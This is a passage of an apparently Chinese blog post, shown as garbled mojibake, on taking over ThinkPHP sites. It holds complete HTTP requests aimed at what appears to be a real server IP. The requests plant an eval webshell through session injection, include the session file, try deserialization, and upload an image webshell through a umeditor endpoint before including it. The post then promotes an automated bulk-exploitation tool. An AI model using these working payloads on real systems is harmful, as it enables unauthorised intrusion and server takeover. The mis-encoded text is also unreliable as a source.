è¿™é‡Œç”Ÿæˆçš„æœ¨é©¬å¯ä»¥ä¿®æ”¹é˜²æ­¢æ²¡æœ‰è®¿é—®æƒé™åˆ°å¯¼è‡´æ— æ³•æ”¾åˆ°ä¿®æ”¹X&#x3D;ä¿®æ”¹è¿™é‡Œçš„è·¯å¾„<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271505273.png" alt="è®¿é—®æˆ‘ä»¬çš„shell"><br>æ—¥å¿—è¿™ä¸ªä¸œè¥¿ä¸å¤ªç¨³å®šå¦å¤–æœ‰ç‚¹éº»çƒ¦ã€‚æˆ‘ä»¬èƒ½ä¸èƒ½ä½¿ç”¨åˆ«çš„æ–¹å¼è¿›è¡Œã€‚ç­”æ¡ˆæ˜¯å¯ä»¥çš„æˆ‘ä»¬ä½¿ç”¨sessionæ¥æä»–ä»¥linuxä¸ºä¾‹å­ã€‚å¦‚æœwindowsçš„è¯ç­‰é‡åˆ°çš„æ—¶å€™å®æˆ˜æä¸€æ³¢åœ¨æ›´æ–°è®°å½•ä¸€ä¸‹ã€‚</p><h2 id="ä¸‰-sessionæ–¹å¼æ‰“"><a href="#ä¸‰-sessionæ–¹å¼æ‰“" class="headerlink" title="ä¸‰:sessionæ–¹å¼æ‰“"></a>ä¸‰:sessionæ–¹å¼æ‰“</h2><p>åˆ›å»ºsessionã€‚linuxä¸ºä¾‹å­:</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span><span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=sessiontest; think_var=zh-cnConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 136_method=__construct&amp;filter[]=think\Session::set&amp;method=get&amp;get[]=&lt;?php $a=strtoupper('$_post["x"]');eval("eval($a);")?>&amp;server[]=1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271508586.png" alt="ç”Ÿæˆsession"><br>åŒ…å«session</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span><span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=sessiontest; think_var=zh-cnConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 526_method=__construct&amp;filter[]=think\__include_file&amp;method=GET&amp;get[]=/tmp/sess_sessiontest&amp;X=phpinfo();</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271512019.png" alt="åŒä¸Šå†™shell"><br>è®¿é—®ä¸€ä¸‹shell<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271516089.png" alt="è®¿é—®ä¸€ä¸‹shell"><br>ä¸Šé¢ä¸ç®¡æ˜¯æ—¥å¿—è¿˜æ˜¯sessionåªè¦çŸ¥é“ä½ç½®å°±å¯ä»¥ç›´æ¥æ‰“ã€‚å¦å¤–è¿™äº›å¤ªéº»çƒ¦äº†æˆ‘ä»¬èƒ½ä¸èƒ½ç”¨åˆ«çš„æ‰“å¯ä»¥æˆ‘ä»¬ä½¿ç”¨ååºåˆ—åŒ–çš„æ‰“ä¸€ä¸‹çœ‹çœ‹</p><h2 id="å››-ååºåˆ—åŒ–æ‰“æ³•"><a href="#å››-ååºåˆ—åŒ–æ‰“æ³•" class="headerlink" title="å››:ååºåˆ—åŒ–æ‰“æ³•"></a>å››:ååºåˆ—åŒ–æ‰“æ³•</h2><p>ä¸‹å›¾æ˜¯æ²¡æ‰“æˆåŠŸ</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> xxxx<span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=sessiontest; think_var=zh-cnConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 1880_method=__construct&amp;method=get&amp;filter=unserialize&amp;get[]=ååºåˆ—åŒ–payload</span></code></pre><p>æ²¡æ‰“æˆåŠŸ<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271519340.png" alt="æ²¡æ‰“æˆåŠŸ"><br>æˆ‘ä»¬æ¢ä¸€ä¸ªç«™ç‚¹çœ‹çœ‹ã€‚æ³¨æ„çœ‹è¿”å›åˆ¤æ–­æ˜¯å¦æˆåŠŸ<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271522313.png" alt="æˆåŠŸ"><br>è®¿é—®webshell<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271526124.png" alt="webshell"><br>exp poc ç”Ÿæˆå™¨ è¯·å‚è€ƒ<br><a href="https://www.anquanke.com/post/id/251318">https://www.anquanke.com/post/id/251318</a></p><h2 id="äº”-ä»£ç å®¡è®¡å®¡è®¡å‡ºä¸Šä¼ æ¼æ´è¿›è¡Œæ–‡ä»¶"><a href="#äº”-ä»£ç å®¡è®¡å®¡è®¡å‡ºä¸Šä¼ æ¼æ´è¿›è¡Œæ–‡ä»¶" class="headerlink" title="äº”:ä»£ç å®¡è®¡å®¡è®¡å‡ºä¸Šä¼ æ¼æ´è¿›è¡Œæ–‡ä»¶"></a>äº”:ä»£ç å®¡è®¡å®¡è®¡å‡ºä¸Šä¼ æ¼æ´è¿›è¡Œæ–‡ä»¶</h2><p>å¦‚æœä¸Šè¿°éƒ½æ‰“ä¸æˆåŠŸé‚£ä¹ˆä½¿ç”¨ä»£ç å®¡è®¡å®¡è®¡å‡ºä¸Šä¼ æ¼æ´è¿›è¡Œæ–‡ä»¶åŒ…å«æ¼æ´æ‹¿ä¸‹æƒé™ã€‚å› ä¸ºç°åœ¨çš„ç«™ç‚¹éƒ½ä¸æ˜¯é‚£ä¹ˆå¥½æ‹¿äº†æ‰€ä»¥æƒ³åŠæ³•æ‹¿åˆ°æºä»£ç ä»£ç å®¡è®¡åªè¦æœ‰ä¸Šä¼ æ¼æ´æˆ‘ä»¬å°±å¯ä»¥æ‹¿ä¸‹webshellã€‚ä¸‹é¢æ˜¯æˆ‘ä»¬å¯¹æŸç¼–è¾‘å™¨å®¡è®¡ä¸Šä¼ æ¼æ´ä»è€Œæ‹¿ä¸‹webshell<br>ä¸Šä¼ ç‚¹</p><pre class="language-java" data-language="java"><code class="language-java">GET <span class="token operator">/</span><span class="token keyword">static</span><span class="token operator">/</span><span class="token keyword">public</span><span class="token operator">/</span>umeditor<span class="token operator">/</span>php<span class="token operator">/</span>imageUp<span class="token punctuation">.</span>php HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span><span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Origin</span><span class="token operator">:</span> <span class="token keyword">null</span>DNT<span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Connection: closeè¿”å›HTTP/1.1 200 OKServer: nginxDate: Sun, 16 Jun 2024 06:28:45 GMTContent-Type: text/html;charset=utf-8Connection: closeVary: Accept-EncodingContent-Length: 142&#123;"originalName":null,"name":null,"url":null,"size":null,"type":null,"state":"\u6587\u4ef6\u5927\u5c0f\u8d85\u51fa post_max_size \u9650\u5236"&#125;ä¸Šä¼ åˆ¶ä½œå¥½çš„å›¾ç‰‡é©¬POST /static/public/umeditor/php/imageUp.php HTTP/1.1Host: 103.106.188.58Content-Length: 1754Cache-Control: max-age=0Origin: nullDNT: 1Upgrade-Insecure-Requests: 1Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIbsNB4Zw4vqxb9kGUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.95 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/</span><span class="token operator">*</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.8</span><span class="token punctuation">,</span>application<span class="token operator">/</span>signed<span class="token operator">-</span>exchange<span class="token punctuation">;</span>v<span class="token operator">=</span>b3<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.7</span><span class="token class-name">Accept</span><span class="token operator">-</span><span class="token class-name">Encoding</span><span class="token operator">:</span> gzip<span class="token punctuation">,</span> deflate<span class="token punctuation">,</span> br<span class="token class-name">Accept</span><span class="token operator">-</span><span class="token class-name">Language</span><span class="token operator">:</span> zh<span class="token operator">-</span>CN<span class="token punctuation">,</span>zh<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token class-name">Connection</span><span class="token operator">:</span> close<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token class-name">WebKitFormBoundaryIbsNB4Zw4vqxb9kG</span><span class="token class-name">Content</span><span class="token operator">-</span><span class="token class-name">Disposition</span><span class="token operator">:</span> form<span class="token operator">-</span>data<span class="token punctuation">;</span> name<span class="token operator">=</span><span class="token string">"upfile"</span><span class="token punctuation">;</span> filename<span class="token operator">=</span><span class="token string">"test.jpg"</span><span class="token class-name">Content</span><span class="token operator">-</span><span class="token class-name">Type</span><span class="token operator">:</span> image<span class="token operator">/</span>pngPNG<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token class-name">WebKitFormBoundaryIbsNB4Zw4vqxb9kG</span><span class="token class-name">Content</span><span class="token operator">-</span><span class="token class-name">Disposition</span><span class="token operator">:</span> form<span class="token operator">-</span>data<span class="token punctuation">;</span> name<span class="token operator">=</span><span class="token string">"submit"</span><span class="token class-name">Submit</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token class-name">WebKitFormBoundaryIbsNB4Zw4vqxb9kG</span><span class="token operator">--</span></code></pre><p>æ¼”ç¤ºå¦‚ä¸‹å›¾:<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271533405.png" alt="å®¡è®¡ä¸Šä¼ "><br>åŒ…å«æ‹¿ä¸‹webshell</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span><span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cnConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 128_method=__construct&amp;filter[]=think\__include_file&amp;method=GET&amp;get[]=static/public/umeditor/php/upload/20240616/17185193394308.jpg</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271535946.png" alt="çœ‹åˆ°åŒ…å«æˆåŠŸå‡ºç°äº†phpæ‰§è¡Œçš„ç‰¹å¾"><br>æ‹¿ä¸‹webshell<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271537644.png"></p><h2 id="è‡ªåŠ¨åŒ–getshel"><a href="#è‡ªåŠ¨åŒ–getshel" class="headerlink" title="è‡ªåŠ¨åŒ–getshel"></a>è‡ªåŠ¨åŒ–getshel</h2><p> åŸºäºä¸Šè¿°getshellæ–¹å¼é™¤äº†æ—¥å¿—æ–¹å¼è½¯ä»¶å·²ç»å…¨éƒ¨é›†æˆ<br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271541266.png" alt="é›†æˆä¸Šè¿°æ¼æ´expåˆ°è½¯ä»¶"><br> å®æˆ˜æµ‹è¯•<br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271542467.png" alt="æ‰¹é‡å®æˆ˜æµ‹è¯•"><br> è½¯ä»¶å·²ç»å‘å¸ƒè¯·åˆ°githubè¿›è¡Œä¸‹è½½ã€‚å¦å¤–å…³äºthinkphp è½¯ä»¶é›†æˆçš„å¦‚æœæ‹¿ä¸ä¸‹shellä¼šè‡ªåŠ¨è®°å½•å¯ä»¥getshellæ–¹å¼ã€‚å½“ç„¶åç»­é‡åˆ°æƒ…å†µä¼šåœ¨æ­¤é›†æˆä¸€æ³¢expã€‚å½“ç„¶å¯¹äºåœ¨2024å¹´è¿™ä¸ªå¹´ä»£å…‰é è½¯ä»¶æ˜¯ä¸è¡Œçš„è¿˜å¾—é è‡ªå·±æœ‰å¸¦å®¡è®¡åŸºç¡€é‚£äº‹åŠåŠŸå€ã€‚</p><p>  åœ¨æŸä¸€æ¬¡æ— æ„ä¸­å‘ç°csdnæœ‰äººå®£ä¼ äº†ä¸€æ³¢ã€‚ä¸å¾—ä¸è¯´æ–‡ç¬”ä¸é”™ã€‚ä½†æ˜¯è¿˜æ˜¯ä½è°ƒè¡Œäº‹å§ã€‚ä¸è¿‡è¿™å°å­ä¹ŸæŒºæœ‰çœ¼å…‰çš„ã€‚è¿™ä¸ªè½¯ä»¶æˆªå›¾å¦‚ä¸‹</p><p>  <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271546768.png" alt="ä¸å¾—ä¸è¯´æ–‡ç¬”ä¸é”™"></p><h2 id="è½¯ä»¶ä»‹ç»"><a href="#è½¯ä»¶ä»‹ç»" class="headerlink" title="è½¯ä»¶ä»‹ç»"></a>è½¯ä»¶ä»‹ç»</h2><p>WebFrameworkTools 5.3 - çº¢é˜Ÿç»¼åˆæ¸—é€æµ‹è¯•åˆ©å™¨<br>æ¥æºç½‘ç«™: <a href="https://blog.csdn.net/gitblog_00073/article/details/139490114">https://blog.csdn.net/gitblog_00073/article/details/139490114</a></p><p><strong>é¡¹ç›®ä»‹ç»</strong></p> <p>WebFrameworkTools æ˜¯ä¸€æ¬¾å¼ºå¤§çš„çº¢é˜Ÿæ¸—é€æµ‹è¯•å·¥å…·&#xff0c;ä¸“ä¸ºä¸“ä¸šå®‰å…¨ç ”ç©¶äººå‘˜å’Œæ¸—é€æµ‹è¯•è€…è®¾è®¡ã€‚å®ƒé›†æˆäº†å¤šç§Webæ¼æ´çš„POCå’ŒEXP&#xff0c;æ—¨åœ¨ç®€åŒ–å’ŒåŠ é€ŸWebåº”ç”¨çš„å®‰å…¨è¯„ä¼°è¿‡ç¨‹ã€‚è½¯ä»¶çš„æœ€æ–°ç‰ˆæœ¬5.3å¸¦æ¥äº†è¯¸å¤šæ”¹è¿›å’Œæ–°çš„æ¼æ´åº“&#xff0c;ä½¿å¾—å®‰å…¨ä¸“å®¶èƒ½å¤Ÿå¿«é€Ÿå“åº”æ–°å‡ºç°çš„å¨èƒã€‚</p> <p><strong>é¡¹ç›®æŠ€æœ¯åˆ†æ</strong></p> <p>è¯¥å·¥å…·åŸºäºC#ç¼–ç¨‹è¯­è¨€æ„å»º&#xff0c;å…¶æ ¸å¿ƒç‰¹æ€§åŒ…æ‹¬&#xff1a;</p> <ol><li><strong>ä¸€é”®ç”Ÿæˆåˆ©ç”¨EXP</strong>: å³ä½¿ä¸å…·å¤‡ç¼–ç¨‹èƒŒæ™¯çš„ç”¨æˆ·ä¹Ÿèƒ½è½»æ¾ç”Ÿæˆexploitã€‚</li><li><strong>è‡ªå®šä¹‰DLLåŠŸèƒ½</strong>: å¯¹äºæœ‰ç»éªŒçš„å¼€å‘è€…æ¥è¯´&#xff0c;å¯ä»¥é€šè¿‡ç¼–å†™è‡ªå·±çš„æ’ä»¶æ¥æ‰©å±•å·¥å…·åŠŸèƒ½ã€‚</li><li><strong>å†…ç½®æ¼æ´åº“</strong>: åŒ…å«äº†å¤§é‡çš„Webæ¼æ´exploits&#xff0c;æ¶µç›–å„ç§æµè¡Œæ¡†æ¶å’Œå¹³å°ã€‚</li><li><strong>æ¨¡å—å†…éƒ¨åŒ–</strong>: ä¼˜åŒ–äº†è½¯ä»¶ç»“æ„&#xff0c;å‡å°ä½“ç§¯&#xff0c;ä¾¿äºæºå¸¦å’Œä½¿ç”¨ã€‚</li><li><strong>æ”¯æŒ.NET Coreçº¿ç¨‹æ± </strong>: æé«˜æ€§èƒ½&#xff0c;å¢å¼ºDLLæ‰§è¡Œæ•ˆç‡ã€‚</li><li><strong>æ™ºèƒ½HTTPå¤´éƒ¨Fuzzer</strong>: å¸®åŠ©è¯†åˆ«æ½œåœ¨çš„è„†å¼±ç‚¹ã€‚</li><li><strong>è‡ªåŠ¨åŒ–æ¼æ´æ£€æµ‹</strong>: å¯å¤„ç†å¤§é‡URL&#xff0c;å®ç°å¤§è§„æ¨¡æµ‹è¯•ã€‚</li></ol> <p><strong>åº”ç”¨åœºæ™¯</strong></p> <p>WebFrameworkToolsé€‚ç”¨äºä»¥ä¸‹åœºæ™¯&#xff1a;</p> <ol><li><strong>ä¼ä¸šå®‰å…¨å»ºè®¾</strong>: ç”¨äºåˆæ³•æˆæƒçš„å®‰å…¨æµ‹è¯•&#xff0c;å¸®åŠ©åŠ å¼ºç³»ç»Ÿé˜²æŠ¤ã€‚</li><li><strong>æ¸—é€æµ‹è¯•</strong>: å¿«é€ŸéªŒè¯Webåº”ç”¨ä¸­çš„å®‰å…¨æ¼æ´&#xff0c;æœ‰æ•ˆæå‡æµ‹è¯•æ•ˆç‡ã€‚</li><li><strong>æ•™è‚²ç ”ç©¶</strong>: å­¦ä¹ Webå®‰å…¨å’Œæ¸—é€æµ‹è¯•æŠ€å·§&#xff0c;å®è·µå®‰å…¨æ”»é˜²ã€‚</li><li><strong>å®‰å…¨åº”æ€¥å“åº”</strong>: å½“æ–°æ¼æ´æŠ«éœ²æ—¶&#xff0c;å¿«é€Ÿå¯¹ç›®æ ‡ç¯å¢ƒè¿›è¡Œå®‰å…¨æ‰«æã€‚</li></ol> <p><strong>é¡¹ç›®ç‰¹ç‚¹</strong></p> <ol><li><strong>é«˜åº¦é›†æˆ</strong>: å°†å¤šç§å·¥å…·&#xff08;å¦‚Vulmapã€Http Fuzzerå’ŒExploit Generator&#xff09;çš„åŠŸèƒ½èä¸ºä¸€ä½“&#xff0c;å®ç°å¤šåŠŸèƒ½ä¸€ç«™å¼æ“ä½œã€‚</li><li><strong>ä¾¿æ·æ˜“ç”¨</strong>: ç”¨æˆ·å‹å¥½ç•Œé¢å’Œä¸€é”®å¼æ“ä½œé™ä½äº†ä½¿ç”¨é—¨æ§›ã€‚</li><li><strong>æŒç»­æ›´æ–°</strong>: æŒç»­è·Ÿè¿›æœ€æ–°çš„æ¼æ´ä¿¡æ¯&#xff0c;ä¿æŒæ¼æ´æ•°æ®åº“çš„å®æ—¶æ€§ã€‚</li><li><strong>æºä»£ç å®‰å…¨</strong>: å¼€æºè®¡åˆ’å³å°†å¯åŠ¨&#xff0c;ç”¨æˆ·å¯å®¡æŸ¥ä»£ç ç¡®ä¿é€æ˜åº¦å’Œå®‰å…¨æ€§ã€‚</li><li><strong>åˆè§„æ€§</strong>: æ˜ç¡®ä½¿ç”¨æ¡æ¬¾&#xff0c;å¼ºè°ƒåˆæ³•ä½¿ç”¨&#xff0c;ä¿æŠ¤ç”¨æˆ·å…å—æ³•å¾‹é£é™©ã€‚</li></ol> <p><strong>ç»“è®º</strong></p> <p>WebFrameworkTools 5.3ä»¥å…¶å…¨é¢çš„åŠŸèƒ½å’Œæ˜“ç”¨æ€§&#xff0c;æˆä¸ºäº†çº¢é˜Ÿæ¸—é€æµ‹è¯•é¢†åŸŸçš„ä¸€æ¬¾å¿…å¤‡å·¥å…·ã€‚æ— è®ºæ˜¯æ–°æ‰‹è¿˜æ˜¯ç»éªŒä¸°å¯Œçš„å®‰å…¨ä¸“å®¶&#xff0c;éƒ½èƒ½ä»ä¸­å—ç›Šã€‚éšç€æºä»£ç å³å°†å¯¹å¤–å¼€æº&#xff0c;æ›´å¤šå®‰å…¨ç¤¾åŒºçš„è´¡çŒ®å°†ä¼šè¿›ä¸€æ­¥ä¸°å¯Œå’Œå®Œå–„è¿™ä¸ªé¡¹ç›®ã€‚å¦‚æœä½ ä»äº‹ç›¸å…³é¢†åŸŸçš„å·¥ä½œ&#xff0c;ä¸å¦¨å°è¯•ä¸€ä¸‹WebFrameworkTools&#xff0c;è®©å®‰å…¨æµ‹è¯•å˜å¾—æ›´åŠ é«˜æ•ˆã€‚</p>               <p>ä½¿ç”¨æ–¹å¼è¯·å‚è€ƒåšå®¢æˆ–è€…githubã€‚æˆ–è€…åŠ 